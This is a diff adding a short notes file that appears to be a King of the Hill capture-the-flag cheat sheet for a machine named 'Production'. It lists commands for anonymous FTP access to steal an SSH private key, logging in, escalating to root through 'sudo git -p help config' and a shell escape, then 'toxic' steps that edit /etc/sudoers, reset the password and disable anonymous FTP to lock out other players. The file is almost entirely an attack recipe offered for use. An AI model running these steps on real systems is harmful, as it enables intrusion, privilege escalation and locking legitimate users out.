@@ -1,0 +1,36 @@
+Production (FT):
+
+Fast Track exploitation (for being toxic in KOTH):
+(Add ip to /etc/hosts as “production”)
+
+#initial access (ftp)
+ftp production 21
+anonymous
+get authorized_keys
+get id_rsa
+get flag.txt
+bye
+
+#connect and ftp flag
+cat flag.txt
+chmod 600 id_rsa
+ssh -i id_rsa ashu@production
+
+#priv esc
+sudo -l
+/bin/su skidy
+sudo git -p help config
+!/bin/bash
+
+#toxic
+vim /etc/sudoers
+remove skidy and ashu
+passwd
+Password123!@#
+find / -name flag.txt 2> /dev/null
+find flags, error to /dev/null
+vim /etc/vsftpd/vsftpd.conf
+disable anonymous login
+anonymous_enable=NO
+systemctl ftp restart
+Congrats, you are now the toxic champion…wooooo
